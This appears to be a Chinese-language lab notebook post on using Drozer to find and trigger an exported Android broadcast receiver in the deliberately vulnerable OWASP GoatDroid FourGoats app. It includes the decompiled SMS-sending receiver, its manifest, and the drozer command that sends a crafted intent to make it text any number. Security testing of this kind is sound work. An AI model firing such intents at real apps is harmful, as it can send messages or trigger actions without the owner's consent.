---
title: Test Sieve - broadcast receivers exported
tags: [Android, Drozer]

category: "Tools｜Others｜Android Related｜Drozer｜Test Sieve"
date: 2024-06-04
---

# Test Sieve - broadcast receivers exported
<!-- more -->
這個就不是用Sieve做示範，因為這個App沒有match的receiver
```bash
dz> run app.broadcast.info -a com.mwr.example.sieve
Attempting to run shell module
Package: com.mwr.example.sieve
  No matching receivers.
```
所以我就用之前安裝的goatdroid做示範
1. 檢查broadcast receiver
    ```bash
    dz> run app.broadcast.info -a org.owasp.goatdroid.fourgoats
    Attempting to run shell module
    Package: org.owasp.goatdroid.fourgoats
      org.owasp.goatdroid.fourgoats.broadcastreceivers.SendSMSNowReceiver
        Permission: null
    ```
2. 確認後就逆向看一下
    在`org.owasp.goatdroid.fourgoats.broadcastreceivers`中有SendSMSNowReceiver這個class，內容如下:
    ```java
    public class SendSMSNowReceiver extends BroadcastReceiver {
        Context context;

        @Override // android.content.BroadcastReceiver
        public void onReceive(Context arg0, Intent arg1) {
            this.context = arg0;
            SmsManager sms = SmsManager.getDefault();
            Bundle bundle = arg1.getExtras();
            sms.sendTextMessage(bundle.getString("phoneNumber"), null, bundle.getString("message"), null, null);
            Utils.makeToast(this.context, Constants.TEXT_MESSAGE_SENT, 1);
        }
    }
    ```
3. Send Something
    此時我們就可以用drozer發出一個intent，但是在發出之前要看一下AndroidManifest.xml中對於receiver的描述如下，如果想知道這個intent-filter代表的事情可以參考[^chatgpt-intent-filter]，簡單來說就是所有app都可以發出broadcast，那什麼樣的intent會被goatdroid所接收呢?就是帶有`org.owasp.goatdroid.fourgoats.SOCIAL_SMS`這個action才會被接收，並且觸發onReceive這個function
    ```xml
    <manifest versionCode="1" versionName="1.0" package="org.owasp.goatdroid.fourgoats">
      ...
      <application theme="@2131361870" label="@2131296266" icon="@2130837632" debuggable="true">
        ...
        <receiver label="Send SMS" name=".broadcastreceivers.SendSMSNowReceiver">
          <intent-filter>
            <action name="org.owasp.goatdroid.fourgoats.SOCIAL_SMS"></action>
          </intent-filter>
        </receiver>
      </application>
      ...
    </manifest>
    ```
    ```bash!
    dz> run app.broadcast.send --action org.owasp.goatdroid.fourgoats.SOCIAL_SMS --component org.owasp.goatdroid.fourgoats.broadcastreceivers SendSMSNowReceiver --extra string phoneNumber 123456789 --extra string message "Hello mate!"
    ```
    因為fourgoat這個App需要一個server，但是原作把server的link下架了，所以我也不知道實際送出這個broadcast會有什麼效果，但就是先紀錄起來，之後有機會可以用